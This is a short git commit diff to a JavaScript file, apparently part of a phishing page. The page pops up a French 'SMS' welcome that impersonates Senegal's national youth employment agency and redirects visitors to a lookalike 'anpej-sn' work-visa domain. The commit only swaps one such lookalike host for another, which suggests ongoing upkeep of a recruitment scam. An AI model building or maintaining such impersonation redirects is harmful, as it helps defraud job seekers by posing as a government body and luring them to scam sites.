5fde1f31b9b60daa1fc3c74e07a8c9e85035244c
KENNY <examtapz+me@gmail.com>
2026-05-26 10:48:06 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -2,5 +2,5 @@
 var password = 'Recrutement'
 password=prompt('SMS: bienvenue à lAgence Nationale pour la Promotion de lEmploi des Jeunes, Veuillez appuyer sur OK pour continuer. ','Recrutement');
 if (password != 'Recrutement') {
-location.href='https://anpej-sn.workvisa.live/staff';
+location.href='https://anpej-sn.work-visa.site/staff';
 }
